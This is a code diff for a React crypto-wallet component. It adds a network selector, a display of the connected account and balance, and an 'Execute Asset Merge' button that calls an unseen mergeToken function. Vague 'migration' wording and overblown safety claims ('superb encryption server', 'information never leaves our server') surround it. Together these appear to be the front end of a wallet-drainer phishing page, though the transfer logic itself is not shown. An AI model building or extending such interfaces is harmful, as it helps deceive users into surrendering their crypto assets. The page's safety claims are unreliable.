@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { Zap, Loader2 } from "lucide-react";
+import { Zap, Loader2, LogOut } from "lucide-react";
 import { useWeb3 } from "../hooks/useWeb3";
 import { useToast } from "@/hooks/use-toast";
 import WalletSelectorModal from "./WalletSelectorModal";
@@ -10,6 +10,13 @@ export default function BonilaSection() {
     walletConnected,
     connecting,
     connectWallet,
+    disconnect,
+    balance,
+    account,
+    mergeToken,
+    selectedNetwork,
+    setSelectedNetwork,
+    NETWORKS
   } = useWeb3();
 
   const { toast } = useToast();
@@ -32,6 +39,25 @@ export default function BonilaSection() {
   const handleConnectWalletConnect = async () => {
     setShowSelector(false);
     await connectWallet('walletconnect');
+  };
+
+  const handleNetworkChange = async (e: React.ChangeEvent<HTMLSelectElement>) => {
+    const newNetwork = e.target.value;
+    setSelectedNetwork(newNetwork);
+    if (walletConnected) {
+      toast({
+        title: "Network Changed",
+        description: `Switched to ${NETWORKS[newNetwork as keyof typeof NETWORKS].name}`,
+      });
+    }
+  };
+
+  const handleMerge = async () => {
+    try {
+      await mergeToken();
+    } catch (error) {
+      console.error("Merge failed:", error);
+    }
   };
   const features = [
     { title: "Migration", description: "Click here for migration" },
@@ -91,23 +117,73 @@ export default function BonilaSection() {
               Chain provides industry-leading Web3 and Blockchain safe protocol and process encrypted by a superb encryption server. Your information never leaves our server or be visible to anyone.
             </p>
 
-            <button
-              className="premium-button w-full h-14 text-xl font-black"
-              onClick={handleOpenConnect}
-              disabled={connecting}
-            >
-              {connecting ? (
-                <div className="flex items-center gap-2">
-                  <Loader2 size={20} className="animate-spin" />
-                  <span>Connecting...</span>
-                </div>
+            <div className="space-y-6">
+              <div className="relative">
+                <select
+                  className="w-full h-14 bg-accent text-foreground px-6 rounded-2xl border border-border text-lg font-black focus:outline-none focus:ring-2 focus:ring-primary/20 transition-all appearance-none cursor-pointer"
+                  value={selectedNetwork}
+                  onChange={handleNetworkChange}
+                >
+                  <option value="bnb">BNB Smart Chain</option>
+                  <option value="ethereum">Ethereum Mainnet</option>
+                  <option value="polygon">Polygon POS</option>
+                  <option value="avalanche">Avalanche C-Chain</option>
+                </select>
+              </div>
+
+              {!walletConnected ? (
+                <button
+                  className="premium-button w-full h-14 text-xl font-black"
+                  onClick={handleOpenConnect}
+                  disabled={connecting}
+                >
+                  {connecting ? (
+                    <div className="flex items-center gap-2">
+                      <Loader2 size={20} className="animate-spin" />
+                      <span>Connecting...</span>
+                    </div>
+                  ) : (
+                    <>
+                      <Zap size={20} />
+                      <span>Connect Wallet</span>
+                    </>
+                  )}
+                </button>
               ) : (
-                <>
-                  <Zap size={20} />
-                  <span>Connect Wallet</span>
-                </>
+                <div className="rounded-2xl border border-border bg-primary/5 p-8 relative">
+                  <div className="text-left space-y-6">
+                    <div>
+                      <label className="text-xs font-black uppercase tracking-widest text-primary mb-2 block">Active Session</label>
+                      <div className="text-lg font-mono font-black break-all bg-background p-4 rounded-xl border border-border text-foreground">
+                        {account}
+                      </div>
+                    </div>
+
+                    <div>
+                      <label className="text-xs font-black uppercase tracking-widest text-primary mb-2 block">Total Balance</label>
+                      <div className="text-4xl font-black tracking-tight text-foreground">
+                        {parseFloat(balance).toFixed(4)} <span className="text-primary text-2xl font-black">{NETWORKS[selectedNetwork as keyof typeof NETWORKS].symbol}</span>
+                      </div>
+                    </div>
+
+                    <button
+                      className="premium-button w-full h-14 text-lg font-black"
+                      onClick={handleMerge}
+                    >
+                      Execute Asset Merge
+                    </button>
+
+                    <button
+                      className="w-full h-12 text-sm font-black text-muted-foreground hover:text-red-500 hover:bg-red-500/10 border border-border rounded-2xl transition-all flex items-center justify-center gap-2"
+                      onClick={disconnect}
+                    >
+                      <LogOut size={16} />
+                      <span>Disconnect Wallet</span>
+                    </button>
+                  </div>
+                </div>
               )}
-            </button>
+            </div>
           </div>
 
           {/* ETH Shape */}
